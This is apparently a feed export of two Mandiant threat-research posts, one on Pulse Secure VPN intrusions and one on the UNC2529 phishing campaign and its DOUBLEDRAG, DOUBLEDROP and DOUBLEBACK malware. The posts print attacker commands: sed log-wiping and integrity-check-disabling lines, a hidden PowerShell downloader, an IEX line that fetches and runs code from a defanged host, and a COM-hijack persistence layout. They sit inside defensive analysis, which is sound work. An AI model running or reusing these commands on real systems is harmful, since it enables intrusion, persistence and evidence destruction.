  class="code">THINBLOOD</span> Log Wiper but edits logs in-place with
  sed rather than making temporary copies. The sed commands used are:</p>
 <p>
  <span class="code">sed -i
    &quot;s/.\x00[^\x00]*&lt;regex_string&gt;[^\x00]*\x09.\x00//g&quot; /data/runtime/logs/&lt;logfile&gt;</span></p>
 <p>
  <span class="code">sed -i
    &quot;s/\x&lt;hex_char&gt;\x00[^\x00]*$2[^\x00]*\x09\x&lt;hex_char&gt;\x00//g&quot; /data/runtime/logs/&lt;logfile&gt;</span></p>
 <p>The sample embeds the usage information:</p>
 <p>
  <span class="code">usage: /home/bin/bash clear_log.sh [logfile] [keyword(regex)]</span></p>
 <h5>LOCKPICK</h5>
 <p>The file <span class="code">libcrypto.so</span> (SHA256: <span
  class="code">2610d0372e0e107053bc001d278ef71f08562e5610691f18b978123c499a74d8</span>)
  is a shared object containing cryptographic logic from openssl. The
  sample contains a modification to the routine <span
  class="code">bnrand_range</span> that breaks the security of the
  random numbers generated. There are three paths in this routine for
  generating a random big number between a given range. The first case
  is unmodified and generates a zeroed big number, the other two cases
  are patched so that a constant value overwrites the generated random
  value and always returns success. This breaks the random number
  generation by replacing it with a value the attacker knows in all cases.</p>
 <h5>LOCKPICK Patcher</h5>
 <p>The file with the hash <span
  class="code">b990f79ce80c24625c97810cb8f161eafdcb10f1b8d9d538df4ca9be387c35e4</span>
  is a patcher utility responsible for inserting the malicious logic
  known as LOCKPICK. The patcher starts by running sed on the integrity
  checker script built into the appliance to insert an early exit
  routine. This is inserted by the command <span class="code">sed -i
    '12aexit 0' /home/bin/check_integrity.sh</span> which when applied
  causes this script to exit without performing its intended checks.
  After this the sample uses python file read/write APIs to insert long
  strings of assembly that represent the logic known as LOCKPICK. This
  file is different from the other patchers we’ve identified in that it
  is python and specifically targets system integrity routines.</p>
 <h4>Detecting the Techniques</h4>
 <p>The following table contains specific FireEye product detection
  names for the malware families associated with the exploitation of
  Pulse Secure VPN device.</p>
 <table border="1" cellspacing="0" cellpadding="0" width="695"> <tbody>
    <tr>
      <td width="221" valign="top"><p>
          <b>Platform(s) </b></p> </td> <td width="474" valign="top"><p>
          <b>Detection Name </b></p> </td> </tr>
    <tr>
      <td width="221" valign="top"><p>Network Security </p> <p>Email
        Security </p> <p>Detection On Demand </p> <p>Malware File
        Scanning </p> <p>Malware File Storage Scanning </p> <p> </p>
      </td> <td width="474"
          valign="top"><p>FE_APT_Webshell_PL_HARDPULSE_1<br />
          FEC_APT_Webshell_PL_HARDPULSE_1<br />
        APT.Webshell.PL.HARDPULSE</p>
          <p>FE_APT_Trojan_PL_PULSEJUMP_1<br />
          FEC_APT_Trojan_PL_PULSEJUMP_1<br /> FE_Trojan_PL_Generic_1</p>
          <p>FE_APT_Trojan_PL_RADIALPULSE_1<br />
          FEC_APT_Trojan_PL_RADIALPULSE_1<br />
          FE_APT_Trojan_PL_RADIALPULSE_2<br />
          FE_APT_Trojan_PL_RADIALPULSE_3<br />
          FEC_APT_Trojan_PL_RADIALPULSE_2<br />
          FE_APT_Trojan_PL_RADIALPULSE_4<br />
          FEC_APT_Trojan_PL_RADIALPULSE_3<br />
          FE_APT_Trojan_PL_RADIALPULSE_5<br />
          FE_APT_Tool_SH_RADIALPULSE_1<br />
        FEC_APT_Tool_SH_RADIALPULSE_1</p>
          <p>FE_APT_Trojan_Linux32_PACEMAKER_1<br />
        FE_APT_Trojan_Linux_PACEMAKER_1</p>
          <p>FE_APT_Backdoor_Linux32_SLOWPULSE_1<br />
          FE_APT_Backdoor_Linux32_SLOWPULSE_2 <br />
          FE_APT_Trojan_Linux32_SLOWPULSE_1 <br />
        FE_APT_Tool_Linux32_SLOWPULSE_1</p>
          <p>FE_APT_Webshell_PL_STEADYPULSE_1 <br />
          FEC_APT_Webshell_PL_STEADYPULSE_1 <br />
        APT.Webshell.PL.STEADYPULSE</p>
        <p>FE_APT_Trojan_Linux32_LOCKPICK_1</p>
          <p>FE_Webshell_PL_ATRIUM_1 <br />
          FEC_Webshell_PL_ATRIUM_1<br /> FE_Trojan_SH_ATRIUM_1</p>
          <p>FE_APT_Webshell_PL_SLIGHTPULSE_1<br />
          FEC_APT_Webshell_PL_SLIGHTPULSE_1<br />
        APT.Webshell.PL.SLIGHTPULSE</p>
          <p>FE_APT_Webshell_PL_PULSECHECK_1<br />
        FEC_APT_Webshell_PL_PULSECHECK_1</p>
          <p>FE_APT_Tool_Linux32_THINBLOOD_1 <br />
          FE_APT_Tool_Linux_THINBLOOD_1      <br />
          FE_APT_Tool_SH_THINBLOOD_1 <br />
          FEC_APT_Tool_SH_THINBLOOD_1<br />
        APT.Tool.Linux.THINBLOOD.MVX</p>
          <p>FE_APT_Trojan_PL_QUIETPULSE_1<br />
          FEC_APT_Trojan_PL_QUIETPULSE_1 <br />
          FE_Trojan_SH_Generic_2 <br /> FEC_Trojan_SH_Generic_3</p>
          <p>Suspicious Pulse Secure HTTP request (IPS)</p> </td> </tr>
    <tr>
      <td width="221" valign="top"><p>Endpoint Security </p> </td> <td
        width="474" valign="top"><p>Real-Time (IOC)</p> <ul>
            <li>SLOWPULSE (BACKDOOR)</li> <li>PACEMAKER (LAUNCHER)</li>
            <li>THINBLOOD (UTILITY)</li> </ul> </td> </tr>
    <tr>
      <td width="221" valign="top"><p>Helix</p> </td> <td width="474"
          valign="top"><p>VPN ANALYTICS [Abnormal Logon]<br /> EXPLOIT -
          SONICWALL ES [CVE-2021-20021 Attempt] <br /> EXPLOIT -
          SONICWALL ES [CVE-2021-20021 Success]<br /> EXPLOIT -
          SONICWALL ES [CVE-2021-20023 Attempt]<br /> EXPLOIT -
          SONICWALL ES [CVE-2021-20023 Success]</p> </td> </tr></tbody></table>
 <h4>Mandiant Security Validation Actions</h4>
 <p>Organizations can validate their security controls using the
  following actions with <a
    href="/content/fireeye-www/en_US/mandiant/security-validation.html"
    title="https://www.fireeye.com/mandiant/security-validation.html">Mandiant
    Security Validation</a>.</p>
 <table border="0" cellspacing="0" cellpadding="0" width="611"> <tbody>
    <tr>
      <td width="87"><p>
          <b>VID</b> </p> </td> <td width="525"><p>
          <b>Title</b> </p> </td> </tr>
    <tr>
      <td width="87"><p>A101-596 </p> </td> <td width="525"><p>Malicious
          File Transfer - SLOWPULSE, Download, Variant #1 </p> </td> </tr>
    <tr>
      <td width="87"><p>A101-597 </p> </td> <td width="525"><p>Malicious
          File Transfer - SLOWPULSE, Download, Variant #2 </p> </td> </tr>
    <tr>
      <td width="87"><p>A101-598 </p> </td> <td width="525"><p>Malicious
          File Transfer - SLOWPULSE, Download, Variant #3 </p> </td> </tr>
    <tr>
      <td width="87"><p>A101-599 </p> </td> <td width="525"><p>Malicious
          File Transfer - SLOWPULSE, Download, Variant #4 </p> </td> </tr>
    <tr>
      <td width="87"><p>A101-600 </p> </td> <td width="525"><p>Malicious
          File Transfer - SLOWPULSE, Download, Variant #5 </p> </td> </tr>
    <tr>
      <td width="87"><p>A101-601 </p> </td> <td width="525"><p>Malicious
          File Transfer - SLOWPULSE, Download, Variant #6 </p> </td> </tr>
    <tr>
      <td width="87"><p>A101-602 </p> </td> <td width="525"><p>Malicious
          File Transfer - SLOWPULSE, Download, Variant #7 </p> </td> </tr>
    <tr>
      <td width="87"><p>A101-604 </p> </td> <td width="525"><p>Malicious
          File Transfer - Pulse Secure Vulnerability, Utility, Download,
          Variant #1 </p> </td> </tr>
    <tr>
      <td width="87"><p>A101-605 </p> </td> <td width="525"><p>Malicious
          File Transfer - RADIALPULSE, Download, Variant #1 </p> </td> </tr>
    <tr>
      <td width="87"><p>A101-606 </p> </td> <td width="525"><p>Malicious
          File Transfer - PULSEJUMP, Download, Variant #1 </p> </td> </tr>
    <tr>
      <td width="87"><p>A101-607 </p> </td> <td width="525"><p>Malicious
          File Transfer - HARDPULSE, Download, Variant #1 </p> </td> </tr>
    <tr>
      <td width="87"><p>A101-608 </p> </td> <td width="525"><p>Malicious
          File Transfer - SLIGHTPULSE, Download, Variant #1 </p> </td> </tr>
    <tr>
      <td width="87"><p>A101-609 </p> </td> <td width="525"><p>Malicious
          File Transfer - LOCKPICK, Patcher, Download, Variant #1 </p>
      </td> </tr>
    <tr>
      <td width="87"><p>A101-610 </p> </td> <td width="525"><p>Malicious
          File Transfer - LOCKPICK, Download, Variant #1 </p> </td> </tr>
    <tr>
      <td width="87"><p>A101-611 </p> </td> <td width="525"><p>Malicious
          File Transfer - ATRIUM, Patcher, Download, Variant #1 </p>
      </td> </tr>
    <tr>
      <td width="87"><p>A101-612 </p> </td> <td width="525"><p>Malicious
          File Transfer - PACEMAKER, Launcher, Download, Variant #1 </p>
      </td> </tr>
    <tr>
      <td width="87"><p>A101-613 </p> </td> <td width="525"><p>Malicious
          File Transfer - PACEMAKER, Download, Variant #1 </p> </td> </tr>
    <tr>
      <td width="87"><p>A101-614 </p> </td> <td width="525"><p>Malicious
          File Transfer - QUIETPULSE Utility, Download, Variant #1 </p>
      </td> </tr>
    <tr>
      <td width="87"><p>A101-615 </p> </td> <td width="525"><p>Malicious
          File Transfer - QUIETPULSE, Download, Variant #1 </p> </td> </tr>
    <tr>
      <td width="87"><p>A101-616 </p> </td> <td width="525"><p>Malicious
          File Transfer - STEADYPULSE, Download, Variant #2 </p> </td> </tr>
    <tr>
      <td width="87"><p>A101-617 </p> </td> <td width="525"><p>Malicious
          File Transfer - STEADYPULSE, Download, Variant #1 </p> </td> </tr>
    <tr>
      <td width="87"><p>A101-618 </p> </td> <td width="525"><p>Malicious
          File Transfer - ATRIUM, Download, Variant #1 </p> </td> </tr>
    <tr>
      <td width="87"><p>A101-619 </p> </td> <td width="525"><p>Malicious
          File Transfer - THINBLOOD, Download, Variant #1 </p> </td> </tr>
    <tr>
      <td width="87"><p>A101-620 </p> </td> <td width="525"><p>Malicious
          File Transfer - THINBLOOD, Download, Variant #2 </p> </td> </tr>
    <tr>
      <td width="87"><p>A101-621 </p> </td> <td width="525"><p>Malicious
          File Transfer - PULSECHECK, Download, Variant #1 </p> </td> </tr>
    <tr>
      <td width="87"><p>A101-622 </p> </td> <td width="525"><p>Malicious
          File Transfer - PULSECHECK, Download, Variant #2 </p> </td> </tr>
    <tr>
      <td width="87"><p>A104-757 </p> </td> <td width="525"><p>Host CLI
          - QUIETPULSE Utility, Check, Variant #1 </p> </td> </tr>
    <tr>
      <td width="87"><p>A104-758 </p> </td> <td width="525"><p>Host CLI
          - QUIETPULSE Utility, Check, Variant #2 </p> </td> </tr>
    <tr>
      <td width="87"><p>A104-759 </p> </td> <td width="525"><p>Host CLI
          - QUIETPULSE Utility, Check, Variant #3 </p> </td> </tr>
    <tr>
      <td width="87"><p>A104-760 </p> </td> <td width="525"><p>Host CLI
          - QUIETPULSE Utility, Check, Variant #4 </p> </td> </tr></tbody></table>
 <h4>Acknowledgements</h4>
 <p>Mandiant would like to thank the Stroz Friedberg DFIR and Security
  Testing teams for their collaboration with the analysis and research.
  The team would also like to thank Joshua Villanueva, Regina Elwell,
  Jonathan Lepore, Dimiter Andonov, Josh Triplett, Jacob Thompson
  and Michael Dockry for their hard work in analysis and blog content.</p>
http://www.fireeye.com/blog/threat-research/2021/04/suspected-apt-actors-leverage-bypass-techniques-pulse-secure-zero-day.html2021-04-20T14:00:00.000Z2021-05-10T16:34:49.903ZThe UNC2529 Triple Double: A Trifecta Phishing Campaignnoemail@noemail.orgNick Richard<p>In December 2020, Mandiant observed a widespread, global phishing
  campaign targeting numerous organizations across an array of
  industries. Mandiant tracks this threat actor as <a
  href="/content/fireeye-www/en_US/blog/products-and-services/2020/12/how-mandiant-tracks-uncategorized-threat-actors.html">UNC2529</a>.
  Based on the considerable infrastructure employed, tailored phishing
  lures and the professionally coded sophistication of the malware, this
  threat actor appears experienced and well resourced. This blog post
  will discuss the phishing campaign, identification of three new
  malware families, DOUBLEDRAG, DOUBLEDROP and DOUBLEBACK, provide a
  deep dive into their functionality, present an overview of the actor’s
  modus operandi and our conclusions. A future blog post will focus on
  the backdoor communications and the differences between DOUBLEBACK
  samples to highlight the malware evolution.</p>
 <h4>UNC2529 Phishing Overview</h4>
 <p>Mandiant observed the first wave of the phishing campaign occur on
  Dec. 2, 2020, and a second wave between Dec. 11 and Dec. 18, 2020.</p>
 <p>During the initial flurry, Mandiant observed evidence that 28
  organizations were sent phishing emails, though targeting was likely
  broader than directly observed. These emails were sent using 26 unique
  email addresses associated with the domain
  tigertigerbeads&lt;.&gt;com, and in only a small number of cases did
  we see the same address used across multiple recipient organizations.
  These phishing emails contained inline links to malicious URLs such
  as,
  hxxp://totallyhealth-wealth[.]com/downld-id_mw&lt;redacted&gt;Gdczs,
  engineered to entice the victim to download a file. UNC2529 employed
  at least 24 different domains to support this first, of a three-stage process.</p>
 <p>The structure of URLs embedded in these phishing emails had the
  following patterns, where the string was an alphabetic variable of
  unknown function.</p>
 <p>http://&lt;fqdn&gt;/downld-id_&lt;string&gt;<br />
  http://&lt;fqdn&gt;/downld-id-&lt;string&gt;<br />
  http://&lt;fqdn&gt;/files-upload_&lt;string&gt;<br />
  http://&lt;fqdn&gt;/files-upload-&lt;string&gt;<br />
  http://&lt;fqdn&gt;/get_file-id_&lt;string&gt;<br />
  http://&lt;fqdn&gt;/get_file-id-&lt;string&gt;<br />
  http://&lt;fqdn&gt;/zip_download_&lt;string&gt;<br /> http://&lt;fqdn&gt;/zip_download-&lt;string&gt;</p>
 <p>The first stage payload downloaded from these URLs consisted of a
  Zip compressed file containing a corrupt decoy PDF document and a
  heavily obfuscated JavaScript downloader. Mandiant tracks the
  downloader as DOUBLEDRAG. Interestingly, the PDF documents were
  obtained from public websites, but corrupted by removing bytes to
  render them unreadable with a standard PDF viewer. It is speculated
  that the victim would then attempt to launch the JavaScript (.js)
  file, which can be executed natively with Windows Script Host by
  simply double clicking on the file. All but one of the file name
  patterns for the ZIP, PDF and JS files were
  document_&lt;state&gt;_client-id_&lt;4 digit number&gt;.extension,
  such as “document_Ohio_client-id_8902.zip”.</p>
 <p>Each of the observed DOUBLEDRAG downloaders used in the first wave
  attempted to download a second-stage memory-only dropper, which
  Mandiant tracks as DOUBLEDROP, from either
  hxxp://p-leh[.]com/update_java.dat or
  hxxp://clanvisits[.]com/mini.dat. The downloaded file is a heavily
  obfuscated PowerShell script that will launch a backdoor into memory.
  Mandiant tracks this third-stage backdoor as DOUBLEBACK. DOUBLEBACK
  samples observed during the phishing campaign beaconed to
  hxxps://klikbets[.]net/admin/client.php and hxxps://lasartoria[.]net/admin/client.php.</p>
 <p>Prior to the second wave, observed between Dec. 11 and Dec. 18,
  2020, UNC2529 hijacked a legitimate domain owned by a U.S. heating and
  cooling services company, modified DNS entries and leveraged that
  infrastructure to phish at least 22 organizations, five of which were
  also targeted in the first wave. It is not currently known how the
  legitimate domain was compromised. The threat actor used 20 newly
  observed domains to host the second-stage payload. </p>
 <p>The threat actor made slight modifications to the URL pattern during
  the second wave.</p>
 <p>http://&lt;fqdn&gt;/&lt;string&gt;<br />
  http://&lt;fqdn&gt;/dowld_&lt;string&gt;<br />
  http://&lt;fqdn&gt;/download_&lt;string&gt;<br />
  http://&lt;fqdn&gt;/files_&lt;string&gt;<br />
  http://&lt;fqdn&gt;/id_&lt;string&gt;<br /> http://&lt;fqdn&gt;/upld_&lt;string&gt;</p>
 <p>Of note, the DOUBLEDRAG downloader observed in the first wave was
  replaced with a Microsoft Excel document containing an embedded legacy
  Excel 4.0 (XLM) macro in Excel 97-Excel 2003 Binary file format
  (BIFF8). When the file was opened and the macro executed successfully,
  it would attempt to download a second-stage payload from
  hxxps://towncentrehotels[.]com/ps1.dat. The core functionality of the
  DOUBLEDRAG JavaScript file and the BIFF8 macro is to download a file
  from a hardcoded URL. This Excel file was also found within Zip files,
  as seen in the first wave, although only one of the observed Zip files
  included a corresponding corrupt decoy PDF document. </p>
 <p>Additional DOUBLEBACK samples were extracted from DOUBLEDROP samples
  uploaded to a public malware repository, which revealed additional
  command and control servers (C2),
  hxxps://barrel1999[.]com/admin4/client.php,
  hxxps://widestaticsinfo[.]com/admin4/client.php,
  hxxps://secureinternet20[.]com/admin5/client.php, and
  hxxps://adsinfocoast[.]com/admin5/client.php. Three of these domains
  were registered after the observed second wave.</p>
 <h4>Tailored Targeting</h4>
 <p>UNC2529 displayed indications of target research based on their
  selection of sender email addresses and subject lines which were
  tailored to their intended victims. For example, UNC2529 used a unique
  username, masquerading as an account executive for a small
  California-based electronics manufacturing company, which Mandiant
  identified through a simple Internet search. The username of the email
  address was associated with both sender domains,
  tigertigerbeads&lt;.&gt;com and the compromised HVAC company.
  Masquerading as the account executive, seven phishing emails were
  observed targeting the medical industry, high-tech electronics,
  automotive and military equipment manufacturers, and a cleared defense
  contractor with subject lines very specific to the products of the
  California-based electronics manufacturing company.</p>
 <p>Another example is a freight / transport company that received a
  phish with subject, “compton ca to flowery branch ga”, while a firm
  that recruits and places long-haul truck drivers received a simple,
  “driver” in the subject line.</p>
 <p>A utility company received a phish with subject, “easement to bore
  to our stairwell area.”</p>
 <p>While not all financial institutions saw seemingly tailored
  subjects, numerous appeared fairly unique, as shown in Table 1.<br /> </p>
 <table border="1" cellspacing="0" cellpadding="0"> <tbody>
    <tr>
      <td width="349" valign="top"><p>Subject Lure</p> </td> <td
        width="69" valign="top"><p>Wave</p> </td> </tr>
    <tr>
      <td width="349" valign="top"><p>re: &lt;redacted&gt; outdoors
          environment (1 out of 3)</p> </td> <td width="69"
        valign="top"><p>1st</p> </td> </tr>
    <tr>
      <td width="349" valign="top"><p>accepted: follow up with butch
          &amp; karen</p> </td> <td width="69" valign="top"><p>1st</p>
      </td> </tr>
    <tr>
      <td width="349" valign="top"><p>re: appraisal for &lt;redacted&gt;
          - smysor rd</p> </td> <td width="69" valign="top"><p>2nd</p>
      </td> </tr>
    <tr>
      <td width="349" valign="top"><p>re: &lt;redacted&gt; financing</p>
      </td> <td width="69" valign="top"><p>2nd</p> </td> </tr></tbody></table>
 <p>
  <span class="type-XS">Table 1: Sample financial industry subject lures</span></p>
 <p>Several insurance companies that were targeted saw less specific
  subjects, but still appropriate for the industry, such as those in
  Table 2.</p>
 <table border="1" cellspacing="0" cellpadding="0"> <tbody>
    <tr>
      <td width="349" valign="top"><p>Subject Lure</p> </td> <td
        width="69" valign="top"><p>Wave</p> </td> </tr>
    <tr>
      <td width="349" valign="top"><p>fw: certificate of insurance</p>
      </td> <td width="69" valign="top"><p>1st</p> </td> </tr>
    <tr>
      <td width="349" valign="top"><p>fw: insurance for plow</p> </td>
        <td width="69" valign="top"><p>1st</p> </td> </tr>
    <tr>
      <td width="349" valign="top"><p>please get this information</p>
      </td> <td width="69" valign="top"><p>1st</p> </td> </tr>
    <tr>
      <td width="349" valign="top"><p>question &amp; number request</p>
      </td> <td width="69" valign="top"><p>1st</p> </td> </tr>
    <tr>
      <td width="349" valign="top"><p>claim status</p> </td> <td
        width="69" valign="top"><p>2nd</p> </td> </tr>
    <tr>
      <td width="349" valign="top"><p>applications for medicare
          supplement &amp; part d</p> </td> <td width="69"
        valign="top"><p>2nd</p> </td> </tr></tbody></table>
 <p>
  <span class="type-XS">Table 2: Sample insurance industry subject lures</span></p>
 <p>Interestingly, one insurance company with offices in eastern Texas
  received a phish with a subject related to a local water authority and
  an ongoing water project. While no public information was found to tie
  the company to the other organization or project, the subject appeared
  to be very customized.</p>
 <p>Some patterns were observed, as seen in Table 3. Additionally,
  UNC2529 targeted the same IT services organization in both waves using
  the same lure (1 and 5 in Table 3). Most of the phishing emails with
  lures containing “worker” targeted U.S. organizations. As “worker”
  isn’t a common way to refer to an employee in the U.S., this may
  indicate a non-native American English speaker.</p>
 <table border="1" cellspacing="0" cellpadding="0"> <tbody>
    <tr>
      <td width="349" valign="top"><p>Subject Lure</p> </td> <td
        width="69" valign="top"><p>Wave</p> </td> </tr>
    <tr>
      <td width="349" valign="top"><p>dear worker, your work #
        ujcb0utczl</p> </td> <td width="69" valign="top"><p>1st</p>
      </td> </tr>
    <tr>
      <td width="349" valign="top"><p>good day worker, your job number-
        8ldbsq6ikd</p> </td> <td width="69" valign="top"><p>1st</p>
      </td> </tr>
    <tr>
      <td width="349" valign="top"><p>hello worker, your work number-
        u39hbutlsf</p> </td> <td width="69" valign="top"><p>1st</p>
      </td> </tr>
    <tr>
      <td width="349" valign="top"><p>good day candidate, your vacancy #
        xcmxydis4s</p> </td> <td width="69" valign="top"><p>2nd</p>
      </td> </tr>
    <tr>
      <td width="349" valign="top"><p>dear worker, your work #
        ujcb0utczl</p> </td> <td width="69" valign="top"><p>2nd</p>
      </td> </tr></tbody></table>
 <p>
  <span class="type-XS">Table 3: Sample pattern subject lures</span></p>
 <h4>Industry and Regional Targeting</h4>
 <p>UNC2529’s phishing campaign was both global and impacted an array of
  industries (Industry and Regional Targeting graphics are greater than
  100% due to rounding). While acknowledging some telemetry bias, in
  both waves the U.S. was the primary target, while targeting of EMEA
  and Asia and Australia were evenly dispersed in the first wave, as
  shown in Figure 1.</p>
 <p>
  <img
    src="https://www.fireeye.com/content/dam/fireeye-www/blog/images/unc2529-phishing/fig1.png" alt="" />
  <br /> <span class="type-XS">Figure 1: UNC2529 phishing campaign,
    first wave</span></p>
 <p>In the second wave, EMEA’s percentage increased the most, while the
  U.S. dropped slightly, and Asia and Australia remained at close to the
  same level, as illustrated in Figure 2. </p>
 <p>
  <img
    src="https://www.fireeye.com/content/dam/fireeye-www/blog/images/unc2529-phishing/fig2.png" alt="" />
  <br /> <span class="type-XS">Figure 2: UNC2529 phishing campaign,
    second wave</span></p>
 <p>Although Mandiant has no evidence about the objectives of this
  threat actor, their broad targeting across industries and geographies
  is consistent with a targeting calculus most commonly seen among
  financially motivated groups.</p>
 <h4>Technical Analysis</h4>
 <h5>Overview</h5>
 <p>The Triple DOUBLE malware ecosystem consists of a downloader
  (DOUBLEDRAG) (or alternatively an Excel document with an embedded
  macro), a dropper (DOUBLEDROP), and a backdoor (DOUBLEBACK). As
  described in the previous section, the initial infection vector starts
  with phishing emails that contain a link to download a malicious
  payload that contains an obfuscated JavaScript downloader. Once
  executed, DOUBLEDRAG reaches out to its C2 server and downloads a
  memory-only dropper. The dropper, DOUBLEDROP, is implemented as a
  PowerShell script that contains both 32-bit and 64-bit instances of
  the backdoor DOUBLEBACK. The dropper performs the initial setup that
  establishes the backdoor’s persistence on the compromised system and
  proceeds by injecting the backdoor into its own process
  (PowerShell.exe) and then executing it. The backdoor, once it has the
  execution control, loads its plugins and then enters a communication
  loop, fetching commands from its C2 server and dispatching them. One
  interesting fact about the whole ecosystem is that only the downloader
  exists in the file system. The rest of the components are serialized
  in the registry database, which makes their detection somewhat harder,
  especially by file-based antivirus engines.</p>
 <h4>Ecosystem in Details</h4>
 <h5>DOUBLEDRAG Downloader component</h5>
 <p>The downloader is implemented as a heavily obfuscated JavaScript
  code. Despite the relatively large amount of the code, it boils down
  to the following snippet of code (Figure 3), after de-obfuscation.</p>
 <table cellpadding="1" cellspacing="0" border="1"> <tbody>
    <tr>
      <td><span class="code">&quot;C:\Windows\System32\cmd.exe&quot; /c
          oqaVepEgTmHfPyC &amp; Po^wEr^sh^elL -nop -w hidden -ep bypass
          -enc &lt;base64_encoded_ps_code&gt;</span></td> </tr></tbody></table>
 <p>
  <span class="type-XS">Figure 3: De-obfuscated JavaScript downloader</span></p>
 <p>The <span class="code">&lt;base64_encoded_ps_code&gt;</span>
  downloads and executes a PowerShell script that implements the
  DOUBLEDROP dropper. Note, that the downloaded dropper does not touch
  the file system and it is executed directly from memory. A sanitized
  version of the code, observed in the first phishing wave, is shown in
  Figure 4.</p>
 <table cellpadding="1" cellspacing="0" border="1"> <tbody>
    <tr>
      <td><span class="code">IEX (New-Object
      Net.Webclient).downloadstring(&quot;hxxp://p-leh[.]com/update_java.dat&quot;)</span></td> </tr></tbody></table>
 <p>
  <span class="type-XS">Figure 4: Downloading and executing of the
    DOUBLEDROP dropper</span></p>
 <h4>DOUBLEDROP Dropper component</h4>
 <h5>Overview</h5>
 <p>The dropper component is implemented as an obfuscated in-memory
  dropper written in PowerShell. Two payloads are embedded in the
  script—the same instances of the DOUBLEBACK backdoor compiled for 32
  and 64-bit architectures. The dropper saves the encrypted payload
  along with the information related to its decryption and execution in
  the compromised system’s registry database, effectively achieving a
  file-less malware execution.</p>
 <h5>Setup</h5>
 <p>The dropper's main goal is to serialize the chosen payload along
  with the loading scripts into the compromised system's registry
  database and to ensure that the payload will be loaded following a
  reboot or a user login (see the Persistence Mechanism section). In
  order to do so, the dropper generates three pseudo-random GUIDs and
  creates the registry keys and values shown in Figure 5.</p>
 <table cellpadding="1" cellspacing="0" border="1"> <tbody>
    <tr>
      <td><p>
          <span class="code">*
            HK[CU|LM]\Software\Classes\CLSID\{&lt;rnd_guid_0&gt;}<br />
                   * key: LocalServer<br />                * value:
            &lt;default&gt;<br />                        * data:
            &lt;bootstrap_ps_code&gt;<br />         * key: ProgID<br />
                          * value: &lt;default&gt;<br />               
                    * data: &lt;rnd_guid_1&gt;<br />                *
            value: &lt;last_4_chars_of_rnd_guid_0&gt;<br />             
                      * data: &lt;encoded_loader&gt;<br />         *
            key: VersionIndependentProgID<br />                * value:
            &lt;default&gt;<br />                        * data:
            &lt;rnd_guid_1&gt;<br />                * value:
            &lt;first_4_chars_of_rnd_guid_0&gt;<br />                   
                * data: &lt;encoded_rc4_key&gt;<br />                *
            value: &lt;last_4_chars_of_rnd_guid_0&gt;<br />             
                      * data: &lt;rc4_encrypted_payload&gt;</span></p> <p>
          <span class="code">*
            HK[CU|LM]\Software\Classes\{&lt;rnd_guid_1&gt;}<br />       
             * value: &lt;default&gt;<br />                * data:
            &lt;rnd_guid_1&gt;<br />         * key: CLSID<br />         
                  * value: &lt;default&gt;<br />                       
            * data: &lt;rnd_guid_0&gt;</span></p> <p>
          <span class="code">*
            HK[CU|LM]\Software\Classes\CLSID\{&lt;rnd_guid_2&gt;}<br />
                   * value: &lt;default&gt;<br />                * data:
            &lt;rnd_guid_1&gt;<br />         * key: TreatAs<br />       
                    * value: &lt;default&gt;<br />                     
              * data: &lt;rnd_guid_0&gt;</span></p> </td> </tr></tbody></table>
 <p>
  <span class="type-XS">Figure 5: Registry keys and values created by
    the dropper</span></p>
 <p>Once the registry keys and values are created, the dropper
  dynamically generates the bootstrap and the launcher PowerShell
  scripts and saves them under the <span
  class="code">{&lt;rnd_guid_0&gt;}</span> registry key as shown in
  Figure 5. Additionally, at this point the dropper generates a random
  RC4 key and encodes it inside a larger buffer which is then saved
  under the VersionIndependentProgID key. The actual RC4 key within the
  buffer is given by the following calculations, shown in Figure 6 (note
  that the key is reversed!).</p>
 <table cellpadding="1" cellspacing="0" border="1"> <tbody>
    <tr>
      <td><span class="code">&lt;relative_offset&gt; = buffer[32]<br />
          buffer[32 + &lt;relative_offset&gt; + 1] =
      &lt;reversed_rc4_key&gt;</span></td> </tr></tbody></table>
 <p>
  <span class="type-XS">Figure 6: Encoding of the RC4 key</span></p>
 <p>Finally, the dropper encrypts the payload using the generated RC4
  key and saves it in the respective value under the
  VersionIndependentProgId registry key (see Figure 5).</p>
 <p>At this point all the necessary steps that ensure the payload's
  persistence on the system are complete and the dropper proceeds by
  directly executing the launcher script, so the backdoor receives the
  execution control immediately. The persistence mechanism, the
  bootstrap, and the launcher are described in more details in the
  following sections.</p>
 <h5>Persistence Mechanism</h5>
 <p>The persistence mechanism implemented by the DOUBLEDROP sample is
  slightly different depending on whether the dropper has been started
  within an elevated PowerShell process or not.</p>
 <p>If the dropper was executed within an elevated PowerShell process,
  it creates a scheduled task with an action specified as
  TASK_ACTION_COM_HANDLER and the class ID - the <span
  class="code">{&lt;rnd_guid_2&gt;}</span> GUID (See Figure 5). Once
  executed by the system, the task finds the <span
  class="code">{&lt;rnd_guid_2&gt;}</span> class under the
  HKLM\Software\Classes\CLSID registry path, which in this case points
  to an emulator class via the TreatAs registry key. The <span
  class="code">{&lt;rnd_guid_0&gt;}</span> emulator class ID defines a
  registry key LocalServer and its default value will be executed by the task.</p>
 <p>If the dropper is started within a non-elevated PowerShell process,
  the sequence is generally the same but instead of a task, the malware
  hijacks one of the well-known classes, Microsoft PlaySoundService
  ({2DEA658F-54C1- 4227-AF9B-260AB5FC3543}) or MsCtfMonitor
  ({01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}), by creating an associated
  TreatAs registry key under their definition in the registry database.
  The TreatAs key's default registry value points to the <span
  class="code">{&lt;rnd_guid_0&gt;}</span> emulator class essentially
  achieving the same execution sequence as in the elevated privilege case.</p>
 <h5>Bootstrap</h5>
 <p>The bootstrap is implemented as an obfuscated PowerShell script,
  generated dynamically by the dropper. The content of the code is saved
  under the emulator's class LocalServer registry key and it is either
  executed by a dedicated task in case of a privileged PowerShell
  process or by the operating system that attempts to load the emulator
  for the PlaySoundService or MsCtfMonitor classes. </p>
 <p>The bootstrap code finds the location of the launcher script,
  decodes it and then executes it within the same PowerShell process. A
  decoded and sanitized version of the script is shown in Figure 7.</p>
 <table cellpadding="1" cellspacing="0" border="1"> <tbody>
    <tr>
      <td><span class="code">$enc = [System.Text.Encoding]::UTF8;<br />
          $loader = Get-ItemProperty<br />     
          -Path($enc.GetString([Convert]::FromBase64String('&lt;base64_encoded_path_to_launcher&gt;')))<br />
              -n '&lt;launcher_reg_val&gt;' | Select-Object
          -ExpandProperty '&lt;launcher_reg_val&gt;';<br />  $xor_val =
          &lt;xor_val&gt;;<br />  iex(<br />     
          $enc.GetString($(<br />          for ($i = 0; $i -lt
          $loader.Length; $i++) {<br />              if ($xor_val -ge
          250) {<br />                  $xor_val = 0<br />             
          }<br />              $loader[$i] -bxor $xor_val;<br />       
                $xor_val += 4<br />          }<br />      ))<br />
      )</span></td> </tr></tbody></table>
 <p>
